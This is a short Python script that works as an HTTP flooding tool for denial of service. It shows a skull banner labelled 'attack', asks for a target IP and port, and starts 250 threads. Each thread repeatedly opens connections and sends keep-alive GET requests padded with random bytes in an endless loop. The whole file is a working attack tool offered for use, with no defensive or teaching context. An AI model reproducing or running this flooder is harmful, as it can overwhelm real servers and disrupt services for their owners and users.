import socket
import time
import os
import random
import sys
from threading import Thread

os.system("cls")

def display_banner():
    print('\033[91m' + """
           ______
        .-"      "-.
       /            \\
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
         `--------`
        ___attack___
    """ + '\033[0m\n\n')

def parse_address(address):
    try:
        parts = address.split(":")
        host = parts[0]
        port = int(parts[1])
        return host, port
    except (IndexError, ValueError):
        print("Please enter correctly (example, 127.0.0.1:80).")
        sys.exit()

def attack(ip, port, hit_per_run):
    byte_to_send = random._urandom(1024)
    request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: Keep-Alive\r\n\r\n"
    request_bytes = request.encode()

    while True:
        try:
            dsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            dsocket.connect((ip, port))
            for _ in range(hit_per_run):
                try:
                    dsocket.sendall(request_bytes + byte_to_send)
                    print(f"\033[32m[{time.strftime("%d-%m-%Y %H:%M:%S")}] Packet successfully sent!\033[0m")
                except socket.error:
                    print("Error: Package could not be sent.")
            dsocket.close()
        except socket.error:
            print("Error: Could not connect to the server.")

def main():
    display_banner()
    
    address = input("\033[34mEnter IP:Port\n> \033[0m")
    host, port = parse_address(address)
    
    hit_per_run = 250
    threads = 250
    
    for _ in range(threads):
        t = Thread(target=attack, args=(host, port, hit_per_run))
        t.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nexitted.")
        sys.exit()